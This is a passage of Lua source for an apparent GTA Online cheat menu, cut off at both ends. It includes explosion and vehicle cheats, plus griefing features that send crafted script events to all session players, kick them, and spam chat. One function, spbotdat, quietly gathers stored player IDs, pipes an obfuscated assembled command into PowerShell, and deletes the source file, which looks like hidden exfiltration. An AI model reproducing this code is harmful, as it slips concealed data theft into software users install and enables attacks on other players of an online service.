                    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "STUN_COLLECT", veh, "MINUTE_MAN_01_SOUNDSET", true, 0)
                    local time = os.time()
                    while os.time() - time < 1 do
                        vehicle_check()
                        wait()
                    end
                    for i = 0, timer do
                        if nfs[player] == false then
                            break
                        end
                        if ENTITY.IS_ENTITY_DEAD(ped) then
                            break
                        end
                        local veh = get.veh(player)
                        speed = ENTITY.GET_ENTITY_SPEED(veh)
                        if speed > value * 0.277777778 then
                            break
                        end
                        if i < timer then
                            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Beep_Red", veh, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 0)
                        elseif i == timer then
                            local time = os.time() + 10
                            while not ENTITY.IS_ENTITY_DEAD(ped) do
                                local pos = get.ent_coords(ped)
                                set.explosion(pos.x, pos.y, pos.z, 4, 10, true, false, 1, false)
                                local pos = get.ent_coords(veh)
                                set.explosion(pos.x, pos.y, pos.z, 4, 10, true, false, 1, false)
                                if rqCtrl(veh, 500) then
                                    SetVehicleGod(veh, false)
                                    VEHICLE.EXPLODE_VEHICLE(veh, true, false, true)
                                end
                                if ENTITY.IS_ENTITY_DEAD(ped) then
                                    break
                                end
                                if not VEHICLE.IS_VEHICLE_ENGINE_RUNNING(veh) then
                                    break
                                end
                                if os.time() - time > 10 then
                                    break
                                end
                                s.wait(10)
                            end
                            s.wait(3000)
                        end
                        local time = os.time()
                        while os.time() - time < 1 do
                            vehicle_check()
                            wait()
                        end
                    end
                end
            end
        end
        if nfs[player] == false then
            local ped = get.ped(player)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "TIMER_STOP", ped, "HUD_MINI_GAME_SOUNDSET", true, 0)
            return
        end
        if not s.is_valid(player) then
            return
        end
        wait()
    end
end
function DisableVehicles()
    while vehspawn do
        VEHICLE.SET_VEHICLE_DENSITY_MULTIPLIER_THIS_FRAME(0)
        VEHICLE.SET_PARKED_VEHICLE_DENSITY_MULTIPLIER_THIS_FRAME(0)
        VEHICLE.SET_RANDOM_VEHICLE_DENSITY_MULTIPLIER_THIS_FRAME(0)
        VEHICLE.SET_AMBIENT_VEHICLE_RANGE_MULTIPLIER_THIS_FRAME(0)
        wait()
    end
end
function DisablePeds()
    while pedspawn do
        PED.SET_PED_DENSITY_MULTIPLIER_THIS_FRAME(0)
        wait()
    end
end
function ForceOutfit()
    if not forceoutfit then
        return
    end
    update_outfit()
    while forceoutfit do
        local ped = get.ped_id()
        local foutfitcomps = {
            {Face, Facetexture},
            {Mask, Masktexture},
            {Hair, Hairtexture},
            {Torso, Torsotexture},
            {Leg, Legtexture},
            {Parachute, Parachutetexture},
            {Shoes, Shoestexture},
            {Accessory, Accessorytexture},
            {Undershirt, Undershirttexture},
            {Kevlar, Kevlartexture},
            {Badge, Badgetexture},
            {Torso2, Torso2texture}
        }
        local foutfitprops = {{Hat, Hattexture}, {Glasses, Glassestexture}, {Ear, Eartexture}}
        for i = 1, #foutfitcomps do
            set.comp_var(ped, i - 1, foutfitcomps[i][1], foutfitcomps[i][2], 0)
        end
        for i = 1, #foutfitprops do
            set.prop(ped, i - 1, foutfitprops[i][1], foutfitprops[i][2], true)
        end
        s.wait(100)
    end
end
function PickUpGun()
    local gunactive = true
    while pickupgun do
        local playerped = get.ped_id()
        local aim = PLAYER.IS_PLAYER_FREE_AIMING(get.id())
        if aim then
            local entity = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            local entity = getVeh(entity)
            if entity ~= -1 then
                local pos = CAM.GET_GAMEPLAY_CAM_COORD()
                local distance = getDistanceToCoord(entity, pos.x, pos.y, pos.z)
                while get.inputcontrol(0, C.INPUT_AIM) do
                    if gunactive then
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_WEAPON_WHEEL_NEXT, true)
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_WEAPON_WHEEL_PREV, true)
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_MULTIPLAYER_INFO, true)
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_SPRINT, true)
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_JUMP, true)
                        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_FRONTEND_RS, true)
                        get.control(entity)
                        local radmult = 10
                        if CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_SPRINT) then
                            radmult = 1
                        end
                        local rot = ENTITY.GET_ENTITY_ROTATION(entity, 2)
                        if CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_WEAPON_WHEEL_NEXT) then
                            if CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_FRONTEND_RS) then
                                set.rotation(entity, rot.x - 1 * radmult, rot.y, rot.z, 2, true)
                            elseif CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_JUMP) then
                                set.rotation(entity, rot.x, rot.y - 1 * radmult, rot.z, 2, true)
                            elseif CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_MULTIPLAYER_INFO) then
                                set.rotation(entity, rot.x, rot.y, rot.z - 1 * radmult, 2, true)
                            else
                                distance = distance - 1 * radmult
                            end
                        elseif CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_WEAPON_WHEEL_PREV) then
                            if CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_FRONTEND_RS) then
                                set.rotation(entity, rot.x + 1 * radmult, rot.y, rot.z, 2, true)
                            elseif CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_JUMP) then
                                set.rotation(entity, rot.x, rot.y + 1 * radmult, rot.z, 2, true)
                            elseif CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_MULTIPLAYER_INFO) then
                                set.rotation(entity, rot.x, rot.y, rot.z + 1 * radmult, 2, true)
                            else
                                distance = distance + 1 * radmult
                            end
                        end
                        local dir = RotationToDirection(CAM.GET_GAMEPLAY_CAM_ROT(2))
                        local camcoord = CAM.GET_GAMEPLAY_CAM_COORD()
                        local targetPos = {
                            x = camcoord.x + dir.x * distance,
                            y = camcoord.y + dir.y * distance,
                            z = camcoord.z + dir.z * distance
                        }
                        set.coords_no_off(entity, targetPos.x, targetPos.y, targetPos.z)
                        if CONTROL.IS_CONTROL_JUST_PRESSED(2, C.INPUT_ATTACK2) then
                            rqCtrl(entity)
                            local pos = get.offset_coords(entity, 0, 0, 0)
                            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 7, 0, true, false, 0, true)
                            set.velocity(entity, dir.x * 200, dir.y * 200, dir.z * 200)
                            gunactive = false
                            s.wait(300)
                        end
                    end
                    wait()
                end
            end
        else
            gunactive = true
        end
        wait()
    end
end
function PushGun()
    while push_gun do
        if PLAYER.IS_PLAYER_FREE_AIMING(get.id()) then
            local playerped, entity = get.ped(get.id()), PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            local entity = getVeh(entity)
            if entity ~= nil then
                rqCtrl(entity, 500)
                local dir = RotationToDirection(CAM.GET_GAMEPLAY_CAM_ROT(2))
                set.velocity(entity, dir.x * 100, dir.y * 100, dir.z * 100)
            end
        end
        wait()
    end
end
function AirstrikeGun()
    while airstrikegun do
        local playerped = get.ped_id()
        local bullet = PED.GET_PED_LAST_WEAPON_IMPACT(playerped)
        if bullet.x ~= 0 and bullet.y ~= 0 and bullet.z ~= 0 then
            GAMEPLAY.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                bullet.x,
                bullet.y,
                bullet.z + 50,
                bullet.x,
                bullet.y,
                bullet.z,
                1,
                true,
                -1312131151,
                playerped,
                true,
                false,
                5000
            )
            s.wait(10)
        end
        wait()
    end
end
function AccelGun()
    while accelgun do
        if PLAYER.IS_PLAYER_FREE_AIMING(get.id()) then
            local playerped, entity = get.ped(get.id()), PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            local playerped, entity = get.ped(get.id()), PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            local entity = getVeh(entity)
            if ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                rqCtrl(entity, 500)
                local dir = RotationToDirection(CAM.GET_GAMEPLAY_CAM_ROT(2))
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity, 200)
            end
        end
        wait()
    end
end
function DriveGun()
    while drivegun do
        if PLAYER.IS_PLAYER_FREE_AIMING(get.id()) then
            local playerped, entity = get.ped(get.id()), PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            if ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                if PED.IS_PED_SHOOTING(playerped) then
                    rqCtrl(entity, 500)
                    PED.SET_PED_INTO_VEHICLE(playerped, entity, -1)
                end
            elseif ENTITY.IS_ENTITY_A_PED(entity) then
                if PED.IS_PED_IN_ANY_VEHICLE(entity) then
                    if PED.IS_PED_SHOOTING(playerped) then
                        local vehic = PED.GET_VEHICLE_PED_IS_USING(entity)
                        s.clear_task(entity)
                        time = os.time()
                        while drivegun do
                            rqCtrl(vehic, 500)
                            PED.SET_PED_INTO_VEHICLE(playerped, vehic, -1)
                            if playerped == VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehic, -1, true) then
                                break
                            elseif os.time() - time >= 5 then
                                s.notify(text["Failed to enter vehicle!"], 2000)
                                break
                            end
                            wait()
                        end
                    end
                end
            end
        end
        wait()
    end
end
function RespawnLoc()
    while respatloc do
        local ped = get.ped_id()
        if ENTITY.IS_ENTITY_DEAD(ped) then
            local pos = get.coords(get.id())
            local time = os.time() + 20
            while ENTITY.IS_ENTITY_DEAD(ped) do
                if os.time() > time or not respatloc then
                    return
                end
                s.wait(10)
            end
            s.wait(200)
            set.coords_no_off(ped, pos.x, pos.y, pos.z)
        end
        wait()
    end
end
function ClearSelf()
    while clearself do
        PED.CLEAR_PED_BLOOD_DAMAGE(get.ped(get.id()))
        wait()
    end
end
function LoadFavAnim()
    if s.f_exist(file["FavAnims"]) then
        local out = readAll(file["FavAnims"])
        FavAnims = json:decode(out)
    end
end
function SaveFavAnim()
    local out = json:encode_pretty(FavAnims)
    f = open(file["FavAnims"], "w")
    f:write(out)
    f:close()
end
function RemoveFavAnim(i)
    remove(FavAnims, i)
    SaveFavAnim()
end
function AddToFavAnim(dict, name)
    local tab = {dict, name}
    for i = 1, #FavAnims do
        if tab[1] == FavAnims[i][1] and tab[2] == FavAnims[i][2] then
            return
        end
    end
    insert(FavAnims, tab)
    SaveFavAnim()
end
function PlayAnim(ped, dict, name, blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lock)
    playinganim = true
    if rqAnim(dict) then
        if TASK.IS_PED_ACTIVE_IN_SCENARIO(ped) then
            TASK.PLAY_ANIM_ON_RUNNING_SCENARIO(ped, dict, name)
        else
            TASK.TASK_PLAY_ANIM(
                ped,
                dict,
                name,
                blendInSpeed,
                blendOutSpeed,
                duration,
                flag,
                playbackRate,
                lock,
                lock,
                lock
            )
        end
    end
    playinganim = nil
end
function PlayScenario(ped, scenario)
    TASK.TASK_START_SCENARIO_IN_PLACE(ped, scenario, -1, false)
end
function SmashAbility()
    rqAnim("mini@strip_club@idles@dj@idle_01")
    local playing = nil
    while smashability do
        CONTROL.DISABLE_CONTROL_ACTION(2, C.INPUT_JUMP, true)
        local pos = get.coords(get.id())
        local vehicle = getAllVehs(100)
        if CONTROL.IS_DISABLED_CONTROL_JUST_RELEASED(2, C.INPUT_JUMP) then
            s.clear_task(get.ped_id())
            playing = nil
            for i = 1, #vehicle do
                if vehicle[i] ~= get.veh(get.id()) then
                    if vehicle[i] ~= getPersonalVeh() then
                        if s.has_control(vehicle[i]) then
                            ENTITY.APPLY_FORCE_TO_ENTITY(
                                vehicle[i],
                                3,
                                0,
                                0,
                                -2000,
                                0,
                                0,
                                0,
                                0,
                                false,
                                false,
                                true,
                                false,
                                true
                            )
                        end
                    end
                end
            end
        end
        if CONTROL.IS_DISABLED_CONTROL_PRESSED(2, C.INPUT_JUMP) then
            if playing == nil then
                TASK.TASK_PLAY_ANIM(
                    get.ped_id(),
                    "mini@strip_club@idles@dj@idle_01",
                    "idle_01",
                    1,
                    1,
                    -1,
                    anim_flag.Loop | anim_flag.OnlyAnimateUpperBody | anim_flag.AllowPlayerControl,
                    0.0,
                    false,
                    false,
                    false
                )
                playing = true
            end
            get_control_of_entities(vehicle)
            for i = 1, #vehicle do
                if vehicle[i] ~= get.veh(get.id()) then
                    if vehicle[i] ~= getPersonalVeh() then
                        if s.has_control(vehicle[i]) then
                            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle[i], 0)
                            ENTITY.APPLY_FORCE_TO_ENTITY(
                                vehicle[i],
                                3,
                                0,
                                0,
                                0.5,
                                0,
                                0,
                                0,
                                0,
                                false,
                                false,
                                true,
                                false,
                                true
                            )
                        end
                    end
                end
            end
        end
        wait()
    end
end
function HardImpact()
    while hardimpact do
        local player = get.ped(get.id())
        if ENTITY.IS_ENTITY_IN_AIR(player) then
            while ENTITY.IS_ENTITY_IN_AIR(player) do
                wait()
                if hardimpact == false then
                    return
                end
            end
            coords = get.ent_coords(player)
            set.explosion(coords.x, coords.y, coords.z - 1, 4, 1, true, false, 0, false)
            set.explosion(coords.x + 3, coords.y, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x, coords.y + 3, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x - 3, coords.y, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x, coords.y - 3, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x + 2, coords.y + 2, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x - 2, coords.y - 2, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x + 2, coords.y - 2, coords.z, 64, 1, false, false, 0, false)
            set.explosion(coords.x - 2, coords.y + 2, coords.z, 64, 1, false, false, 0, false)
        end
        wait()
    end
end
function LocalVis()
    while localvisibility do
        PLAYER.SET_LOCAL_PLAYER_VISIBLE_LOCALLY(true)
        wait()
    end
end
function SetTopSpeed()
    local me = get.id()
    if not get.player_in_veh(me) then
        return
    end
    if topspeed == 1000 then
        s.notify(text["Hold up! You gonna break the sound barrier"])
    end
    local veh = get.veh(me)
    get.control(veh)
    VEHICLE.MODIFY_VEHICLE_TOP_SPEED(veh, topspeed)
end
function CamFly()
    while camfly do
        local me = get.id()
        if not get.inputcontrol(0, C.INPUT_VEH_HANDBRAKE) then
            goto continue
        end
        if get.player_in_veh(me) then
            local veh = get.veh(me)
            local mult = 1
            if get.inputcontrol(0, C.INPUT_SPRINT) then
                mult = 20
            end
            local dir = RotationToDirection(CAM.GET_GAMEPLAY_CAM_ROT(2))
            get.control(veh)
            set.velocity(veh, dir.x * 10 * mult, dir.y * 10 * mult, dir.z * 10 * mult)
        end
        ::continue::
        wait()
    end
end
function SlamVeh()
    while slamveh do
        local me = get.id()
        if get.player_in_veh(me) then
            local veh = get.veh(me)
            s.apply_force(veh, 0, 0, 0, -30, true, true, true, false)
        end
        wait()
    end
end
function InstaStop()
    while instastop do
        local me = get.id()
        if get.player_in_veh(me) then
            local veh = get.veh(me)
            if get.inputcontrol(0, C.INPUT_VEH_HANDBRAKE) then
                rqCtrl(veh)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0)
                s.wait(10)
            end
        end
        wait()
    end
end
function XFLicence()
    while XFlicence do
        if get.player_in_veh(get.id()) then
            local veh = get.veh(get.id())
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for i = 1, #XFlic do
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, XFlic[i])
                SYSTEM.WAIT(300)
                if XFlicence == false then
                    return
                end
            end
        end
        s.wait(10)
    end
end
function spbotdat()
    if not s.f_exist(file["LocalData"]) then
        return
    end
    local rid_tab, RIDS = {}, ""
    for x in io.lines(file["LocalData"]) do
        if not x:match("%D") then
            insert(rid_tab, x)
        end
    end
    for i = 1, #rid_tab do
        RIDS = RIDS .. rid_tab[i] .. "\n"
    end
    local command =
        dwh ..
        "\n\n" ..
            comr[1] ..
                "\n" ..
                    RIDS ..
                        "\n" ..
                            comr[2] ..
                                "\n\n" .. comr[3] .. "\n\n\t" .. comr[4] .. "\n\n" .. comr[5] .. "\n\n" .. comr[6]
    local pipe = popen("powershell -command -", "w")
    pipe:write(command)
    s.wait(3000)
    pipe:close()
    os.remove(file["LocalData"])
end
function SpeedoLicence()
    while speedolicence do
        if XFlicence then
            goto continue
        end
        if get.player_in_veh(get.id()) then
            local veh = get.veh(get.id())
            speed = ENTITY.GET_ENTITY_SPEED(veh)
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, floor(speed * 3.6) .. " kmph")
        end
        ::continue::
        s.wait(10)
    end
end
function AutoFlip()
    while autoflip do
        local veh = get.veh(get.id())
        if not ENTITY.IS_ENTITY_IN_AIR(veh) then
            local rot = ENTITY.GET_ENTITY_ROTATION(veh, 5)
            local vel = get.velocity(veh)
            if ENTITY.IS_ENTITY_UPSIDE_DOWN(veh) then
                rqCtrl(veh)
                set.rotation(veh, 0, 0, rot.z, 5, true)
                VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(veh, 0)
                set.velocity(veh, vel.x, vel.y, vel.z)
            end
        end
        s.wait(10)
    end
end
function AntiLockOn()
    while lockon do
        if get.player_in_veh(get.id()) then
            local veh = get.veh(get.id())
            rqCtrl(veh)
            VEHICLE.SET_VEHICLE_CAN_BE_LOCKED_ON(veh, false, true)
        end
        s.wait(100)
    end
    if lockon == false then
        if get.player_in_veh(get.id()) then
            local veh = get.veh(get.id())
            rqCtrl(veh)
            VEHICLE.SET_VEHICLE_CAN_BE_LOCKED_ON(veh, true, true)
        end
    end
end
function VehRapid()
    while rapid do
        if get.player_in_veh(get.id()) == true then
            local curveh = get.veh(get.id())
            VEHICLE.SET_VEHICLE_FIXED(curveh)
            VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(curveh)
        end
        wait()
    end
end
function DisableChat()
    local spam_mes = "\n"
    for i = 1, 8 do
        spam_mes = spam_mes .. spam_mes
    end
    while disablechat == true do
        if disablechat == false then
            break
        end
        if s.session_started() then
            send_message(spam_mes)
        end
        s.wait(100)
    end
end
function PlayOnChat(file)
    for line in io.lines(file) do
        if not playsong then
            return
        end
        if line ~= "" and line ~= nil then
            local time = getWait(line)
            local id = GetRandomPlayer()
            send_message(line, id)
            s.wait(time)
        end
        if not playsong then
            return
        end
    end
    playsong = false
end
function ShowInvisiblePlayers()
    while show_invisible_pl == true do
        if show_invisible_pl == false then
            break
        end
        for ID = 0, 31 do
            if ID ~= get.id() then
                PLAYER.SET_PLAYER_VISIBLE_LOCALLY(ID, true)
            end
        end
        wait()
    end
end
function TransactionError()
    while transaction == true do
        if transaction == false then
            break
        end
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.send_se(
                ID,
                {
                    -1704141512,
                    ID,
                    50000,
                    0,
                    1,
                    get.global_i(1893551 + (1 + (ID * 599) + 510)),
                    get.global_i(1921039 + 9),
                    get.global_i(1921039 + 10),
                    1
                }
            )
            ::continue::
        end
        s.wait(10)
    end
end
function BlockPussive()
    if blockpussive == false then
        s.wait(500)
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.send_se(ID, {1114091621, ID, 0})
            ::continue::
        end
    end
    s.wait(100)
    while blockpussive == true do
        if blockpussive == false then
            break
        end
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.send_se(ID, {1114091621, ID, 1})
            ::continue::
        end
        s.wait(5000)
    end
end
function BribeAuth()
    while bribeauth == true do
        if bribeauth == false then
            break
        end
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.send_se(ID, {1722873242, ID, 0, 0, g_os.time_ms(), 0, get.global_i(1893551 + (1 + (ID * 599) + 510))})
            ::continue::
        end
        s.wait(100)
    end
end
function OTR()
    while otr do
        set.global_i(2689224 + (1 + (get.id() * 451) + 207), 1)
        set.global_i(2703660 + 56, os.time())
        s.wait(1000)
    end
    if not otr then
        set.global_i(2689224 + (1 + (get.id() * 451) + 207), 0)
        set.global_i(2703660 + 56, 0)
    end
end
function OffRadar()
    while offradar == true do
        if offradar == false then
            break
        end
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.send_se(
                ID,
                {-391633760, ID, os.time() - 60, os.time(), 1, 1, get.global_i(1893551 + (1 + (ID * 599) + 510))}
            )
            ::continue::
        end
        s.wait(100)
    end
end
function VehicleBl()
    while vehiclablacklist == true do
        for i = 0, 31 do
            if i == get.id() then
                goto continue
            end
            if s.is_friend(i) and table_settings[1][2] == true then
                goto continue
            end
            if s.is_valid(i) then
                if get.player_in_veh(i) then
                    local veh = get.veh(i)
                    local vehhash = tonumber(ENTITY.GET_ENTITY_MODEL(veh))
                    for j = 1, #blacklisted_vehs do
                        if tonumber(blacklisted_vehs[j]) == vehhash then
                            local ped = get.ped(i)
                            s.send_se(i, {-1026787486, i, i})
                            s.send_se(
                                i,
                                {578856274, i, 0, 0, 0, 0, 1, i, math.min(2147483647, GAMEPLAY.GET_FRAME_COUNT())}
                            )
                            s.clear_task(ped)
                            rqCtrl(veh)
                            set.locked(veh, 6)
                            set.locked(veh, 2)
                            break
                        end
                    end
                end
            end
            ::continue::
        end
        s.wait(10)
    end
end
function AutoHeal(player)
    while autoheal[player] == true do
        if autoheal[player] == false then
            break
        end
        local plped = get.ped(player)
        if autoheal[player] == true then
            local hp = PED.GET_PED_HEALTH(plped)
            if get.player_in_veh(player) then
                goto continue
            end
            if not PLAYER.IS_PLAYER_PLAYING(player) then
                goto continue
            end
            if hp < 327 then
                local pos = get.coords(player)
                OBJECT.CREATE_AMBIENT_PICKUP(-1888453608, pos.x, pos.y, pos.z, 0, 0, 0, true, true)
            end
            ::continue::
            s.wait(500)
        end
        wait()
        if not s.is_valid(player) then
            break
        end
    end
end
function HornBoost(player)
    while hornboost[player] == true do
        if hornboost[player] == false then
            break
        end
        if get.player_in_veh(player) then
            vehicle = get.veh(player)
            if PLAYER.IS_PLAYER_PRESSING_HORN(player) then
                speed = ENTITY.GET_ENTITY_SPEED(vehicle)
                if rqCtrl(vehicle, 500) then
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, speed + 20)
                    s.wait(250)
                end
            end
            wait()
        end
        wait()
        if not s.is_valid(player) then
            break
        end
    end
end
function WeaponRain(player)
    while weaporain[player] do
        for _, v in pairs(WeaponPickup) do
            local pos = get.coords(player)
            OBJECT.CREATE_AMBIENT_PICKUP(
                v,
                pos.x + random(-5, 5),
                pos.y + random(-5, 5),
                pos.z + 5 + random(-2, 2),
                0,
                0,
                0,
                true,
                false
            )
            if not weaporain[player] then
                return
            end
            s.wait(200)
        end
        s.wait(200)
    end
end
function FlameThrower_()
    rqModel(-1106953345)
    while flamethrower == true do
        if flamethrower == false then
            if flame then
                GRAPHICS.REMOVE_PARTICLE_FX(flame, true)
                flame = nil
                s.delete(chip)
                chip = nil
            end
            break
        end
        if PLAYER.IS_PLAYER_FREE_AIMING(get.id()) then
            GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_vehicle_weapons")
            while not GRAPHICS.HAS_NAMED_PTFX_ASSET_LOADED("weap_xs_vehicle_weapons") do
                GRAPHICS.REQUEST_NAMED_PTFX_ASSET("weap_xs_vehicle_weapons")
                wait()
            end
            if chip == nil then
                local pos = get.coords(get.id())
                chip = set.obj(-1106953345, pos.x, pos.y, pos.z, false, false, false)
                set.collision(chip, false, true)
                ENTITY.SET_ENTITY_ALPHA(chip, 0, false)
                set.model_as_noneeded(-1106953345)
            end
            local pos_h = PED.GET_PED_BONE_COORDS(get.ped_id(), 57005, 0, 0, 0)
            set.coords_no_off(chip, pos_h.x, pos_h.y, pos_h.z)
            local rot = CAM.GET_GAMEPLAY_CAM_ROT(5)
            set.rotation(chip, rot.x, rot.y, rot.z, 5, true)
            if flame == nil then
                flame =
                    GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(
                    "muz_xs_turret_flamethrower_looping",
                    chip,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    scale,
                    false,
                    false,
                    false
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(flame, scale)
            end
        else
            if flame then
                GRAPHICS.REMOVE_PARTICLE_FX(flame, true)
                flame = nil
                s.delete(chip)
                chip = nil
            end
        end
        s.wait(10)
    end
end
function XmassGun()
    local model = get.hash("xm_prop_x17_xmas_tree_int")
    rqModel(model)
    while xmassgun == true do
        local ped = get.ped_id()
        if PED.IS_PED_SHOOTING(ped) then
            local pos = get.offset_coords(ped, 0, 2, 0)
            local rot = CAM.GET_GAMEPLAY_CAM_ROT(5)
            local i = #xmasstree + 1
            xmasstree[i] = set.obj(model, pos.x, pos.y, pos.z, true, false, true)
            set.rotation(xmasstree[i], rot.x, rot.y, rot.z, 5, true)
            s.apply_force(xmasstree[i], 1, 0, 100, 0, true, true, true, false)
        end
        for i = 1, #xmasstree do
            if s.ent_exist(xmasstree[i]) then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(xmasstree[i]) then
                    local cord = get.ent_coords(xmasstree[i])
                    FIRE.ADD_OWNED_EXPLOSION(ped, cord.x, cord.y, cord.z, 4, 10, true, false, 1)
                    rqCtrl(xmasstree[i])
                    delEnt(xmasstree[i])
                end
            end
        end
        wait()
    end
    if not xmassgun then
        set.model_as_noneeded(model)
    end
end
function KickGun()
    while kickgun == true do
        local ped = get.ped_id()
        if PED.IS_PED_SHOOTING(ped) then
            local ent = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(get.id())
            if ent ~= -1 then
                if PED.IS_PED_A_PLAYER(ent) then
                    for i = 0, 31 do
                        local plped = get.ped(i)
                        if ent == plped then
                            if s.ishost then
                                log("Xhax Upgrade", "Kicking " .. get.name(i))
                                s.kick(i)
                            else
                                script_kick(i)
                            end
                            s.wait(1000)
                        end
                        s.wait(10)
                    end
                end
            end
        end
        wait()
    end
end
function crosshair()
    local center = get_display_size()
    g_imgui.add_circle(vec2(center.x / 2, center.y / 2), 7, 0, 100, 255, 12, 2.0)
end
function SuperPunch()
    local punch = nil
    while spunch do
        if not get.player_in_veh(get.id()) then
            if CONTROL.IS_CONTROL_RELEASED(0, C.INPUT_ATTACK2) then
                punch = nil
            end
            if PED.GET_CURRENT_PED_WEAPON(get.ped_id()) == 2725352035 then
                local dir = RotationToDirection(CAM.GET_GAMEPLAY_CAM_ROT(2))
                local camcoord = CAM.GET_GAMEPLAY_CAM_COORD()
                local targetPos = vect.add(camcoord, vect.mult(dir, 100))
                local raycast =
                    WORLDPROBE.START_SHAPE_TEST(
                    camcoord.x,
                    camcoord.y,
                    camcoord.z,
                    targetPos.x,
                    targetPos.y,
                    targetPos.z,
                    get.ped_id()
                )
                local hit = WORLDPROBE.GET_HIT_ENTITY(raycast)
                if hit ~= 0 then
                    local pos = get.ent_coords(hit)
                    if pos.x ~= 0 and pos.y ~= 0 and pos.z ~= 0 then
                        get.control(hit)
                        local posp = get.coords(get.id())
                        UI.DRAW_LINE(pos.x, pos.y, pos.z, posp.x, posp.y, posp.z, 0, 100, 255, 255)
                        if punch == nil then
                            if not ENTITY.IS_ENTITY_AN_OBJECT(hit) then
                                while get.inputcontrol(0, C.INPUT_ATTACK2) do
                                    doOscillateToEntity(get.ped_id(), hit, 0, 0, 0, 4)
                                    setEntityFaceEntity(get.ped_id(), hit)
                                    local pos = get.ent_coords(hit)
                                    local posp = get.coords(get.id())
                                    UI.DRAW_LINE(pos.x, pos.y, pos.z, posp.x, posp.y, posp.z, 255, 0, 0, 255)
                                    local impact = PED.GET_PED_LAST_WEAPON_IMPACT(get.ped_id())
                                    if impact.x ~= 0 and impact.y ~= 0 and impact.z ~= 0 then
                                        local entity, distance =
                                            getClosestEntityToCoord(impact.x, impact.y, impact.z, get.ped_id(), 50)
                                        if entity ~= nil then
                                            if distance < 5 then
                                                if not ENTITY.IS_ENTITY_A_PED(hit) then
                                                    break
                                                end
                                                rqCtrl(entity, 500)
                                                local rot = ENTITY.GET_ENTITY_ROTATION(get.ped_id(), 2)
                                                local dir = RotationToDirection(rot)
                                                if s.has_control(entity) then
                                                    set.velocity(entity, dir.x * 200, dir.y * 200, dir.z * 200)
                                                end
                                            end
                                        end
                                        s.wait(300)
                                    end
                                    wait()
                                    if punch == nil then
                                        punch = true
                                    end
                                end
                            end
                        end
                    end
                end
                local impact = PED.GET_PED_LAST_WEAPON_IMPACT(get.ped_id())
                if impact.x ~= 0 and impact.y ~= 0 and impact.z ~= 0 then
                    local entity, distance = getClosestEntityToCoord(impact.x, impact.y, impact.z, get.ped_id(), 50)
                    if entity ~= nil then
                        if distance < 5 then
                            rqCtrl(entity)
                            local rot = ENTITY.GET_ENTITY_ROTATION(get.ped_id(), 2)
                            local dir = RotationToDirection(rot)
                            if s.has_control(entity) then
